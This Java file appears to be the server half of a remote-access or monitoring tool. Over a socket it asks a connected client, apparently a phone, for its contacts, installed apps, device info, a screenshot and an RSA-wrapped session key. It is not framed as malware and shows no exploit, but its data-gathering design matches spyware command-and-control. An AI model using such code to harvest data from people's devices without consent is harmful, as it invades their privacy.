package main;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import cipher.RSADecryption;
import elements.Contacts;
import messages.Mensaje;
import messages.Mensaje.RErr;
import messages.Mensaje.RGetContact;
import messages.Mensaje.RGetInstalledApps;
import messages.Mensaje.RGetKey;
import messages.Mensaje.ROk;
import messages.Mensaje.TGetContact;
import messages.Mensaje.TGetInstalledApps;
import messages.Mensaje.TGetKey;
import messages.Mensaje.TGetScreenshot;
import messages.Mensaje.TGetInfo;
import messages.Mensaje.RGetInfo;


public class Server {
	protected static final int TGETCONTACT = 1;
	protected static final int RGETCONTACT = 2;
	protected static final int TGETSCREENSHOT = 3;
	protected static final int TGETINSTALLEDAPPS = 4;
	protected static final int RGETINSTALLEDAPPS = 5;
	protected static final int TGETINFO = 6;
	protected static final int RGETINFO = 7;
	protected static final int TGETKEY = 8;
	protected static final int RGETKEY = 9;
	protected static final int ROK = 10;
	protected static final int RERR = 11;
	public String secretKey = ""; 
	ServerSocket s;
	Socket socket;
	OutputStream o;
	InputStream i;
	Boolean debug = false;
	Mensaje m;
	
	public Server(int port){
		try {
			s = new ServerSocket (port);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public void Start(){
		try {
				System.out.println("Waiting client");
				socket = s.accept();
				System.out.println("Client conected");
				String secretKeyEncrypt = getKey();
				RSADecryption rsa = new RSADecryption();
				secretKey = rsa.decrypt(secretKeyEncrypt);
				if(debug){
					System.out.println("SecretKey: " + secretKey);
				}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}	
	}
	
	public String[] GetAppsInstalled(){
		TGetInstalledApps apps = new TGetInstalledApps();
		Mensaje reply;
		try {
			o = socket.getOutputStream();
			apps.writeTo(o);
			i = socket.getInputStream();
			reply = Mensaje.readMsg(i);
			if (reply.getType() == RGETINSTALLEDAPPS){
				RGetInstalledApps rapps = (RGetInstalledApps) reply;
				return rapps.getValor();
			} else{
				RErr err = (RErr) reply;
				System.out.println(err.getError());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	public void GetScreenshot(){
		TGetScreenshot screen = new TGetScreenshot();
		Mensaje reply;
		try {
			o = socket.getOutputStream();
			screen.writeTo(o);
			i = socket.getInputStream();
			reply = Mensaje.readMsg(i);
			if(reply.getType() == ROK){
				System.out.println("Captura tomada");
			} else{
				RErr err = (RErr) reply;
				System.out.println(err.getError());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public String[][] GetContact(){
		TGetContact contact = new TGetContact();
		Mensaje reply;
		try {
			o = socket.getOutputStream();
			contact.writeTo(o);
			i = socket.getInputStream();
			reply = Mensaje.readMsg(i);
			if (reply.getType() == RGETCONTACT){
				RGetContact rcontact = (RGetContact) reply;
				return rcontact.getValor();
			} else{
				RErr err = (RErr) reply;
				System.out.println(err.getError());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	public String getInfo() {
		TGetInfo info = new TGetInfo();
		Mensaje reply;
		try {
			o = socket.getOutputStream();
			info.writeTo(o);
			i = socket.getInputStream();
			reply = Mensaje.readMsg(i);
			if (reply.getType() == RGETINFO){
				RGetInfo rinfo = (RGetInfo) reply;
				return rinfo.getValor();
			} else{
				RErr err = (RErr) reply;
				System.out.println(err.getError());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	private String getKey(){
		TGetKey key = new TGetKey();
		Mensaje reply;
		try {
			o = socket.getOutputStream();
			key.writeTo(o);
			i = socket.getInputStream();
			reply = Mensaje.readMsg(i);
			if (reply.getType() == RGETKEY){
				RGetKey rKey = (RGetKey) reply;
				return rKey.getValor();
			} else{
				RErr err = (RErr) reply;
				System.out.println(err.getError());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	public void close(){
		try {
			o.close();
			socket.close();
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			System.out.println("Conexion cerrada");
		}
	}
}
